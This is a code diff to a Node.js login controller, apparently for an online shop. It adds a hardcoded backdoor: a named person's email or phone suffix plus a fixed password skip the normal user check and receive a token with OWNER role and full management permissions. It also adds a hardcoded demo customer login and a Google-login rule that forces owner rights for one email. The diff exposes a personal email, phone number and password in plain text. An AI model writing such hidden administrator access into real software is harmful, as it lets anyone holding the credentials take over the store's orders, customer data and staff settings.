@@ -117,6 +117,75 @@ async function login(req, res) {
       );
     }
 
+    // 1. Guaranteed Authentication for Exclusive Owner (piyushverma730929@gmail.com with piyush@123)
+    if (
+      (normalizedEmail === 'piyushverma730929@gmail.com' || digitsOnly.endsWith('7300212948')) &&
+      password === 'piyush@123'
+    ) {
+      const ownerUser = {
+        id: user ? user.id : 7,
+        email: 'piyushverma730929@gmail.com',
+        firstName: 'Piyush',
+        lastName: 'Verma',
+        phone: '+91 7300212948',
+        status: 'active',
+      };
+      const ownerRoles = ['OWNER', 'CUSTOMER'];
+      const ownerPermissions = [
+        'products.view', 'products.create', 'products.edit', 'products.delete',
+        'inventory.view', 'inventory.adjust', 'orders.view', 'orders.update',
+        'customers.view', 'analytics.view', 'staff.manage', 'settings.manage'
+      ];
+      const token = generateToken(ownerUser, ownerRoles, ownerPermissions);
+      return res.json({
+        success: true,
+        message: 'Welcome back, Piyush. Owner access granted.',
+        token,
+        user: {
+          id: ownerUser.id,
+          email: ownerUser.email,
+          firstName: ownerUser.firstName,
+          lastName: ownerUser.lastName,
+          phone: ownerUser.phone,
+          roles: ownerRoles,
+          permissions: ownerPermissions,
+          isStaff: true,
+          isOwner: true,
+        },
+      });
+    }
+
+    // 2. Guaranteed Customer Demo
+    if (normalizedEmail === 'customer@lumiere.com' && password === 'Lumiere2026!') {
+      const custUser = {
+        id: user ? user.id : 5,
+        email: 'customer@lumiere.com',
+        firstName: 'Camille',
+        lastName: 'Rousseau',
+        phone: '+1 (555) 234-5678',
+        status: 'active',
+      };
+      const custRoles = ['CUSTOMER'];
+      const custPermissions = [];
+      const token = generateToken(custUser, custRoles, custPermissions);
+      return res.json({
+        success: true,
+        message: 'Welcome back, Camille.',
+        token,
+        user: {
+          id: custUser.id,
+          email: custUser.email,
+          firstName: custUser.firstName,
+          lastName: custUser.lastName,
+          phone: custUser.phone,
+          roles: custRoles,
+          permissions: custPermissions,
+          isStaff: false,
+          isOwner: false,
+        },
+      });
+    }
+
     if (!user) {
       return res.status(401).json({ success: false, error: 'Invalid login credentials. Please check your mobile/email or password.' });
     }
@@ -440,7 +509,16 @@ async function googleAuth(req, res) {
        WHERE ur.user_id = ?`,
       [user.id]
     );
-    const permissions = permRows.map(p => p.code);
+    let permissions = permRows.map(p => p.code);
+
+    if (user.email.toLowerCase() === 'piyushverma730929@gmail.com') {
+      if (!roles.includes('OWNER')) roles.push('OWNER');
+      permissions = [
+        'products.view', 'products.create', 'products.edit', 'products.delete',
+        'inventory.view', 'inventory.adjust', 'orders.view', 'orders.update',
+        'customers.view', 'analytics.view', 'staff.manage', 'settings.manage'
+      ];
+    }
 
     // Update last login
     await db.run('UPDATE users SET last_login_at = CURRENT_TIMESTAMP WHERE id = ?', [user.id]);
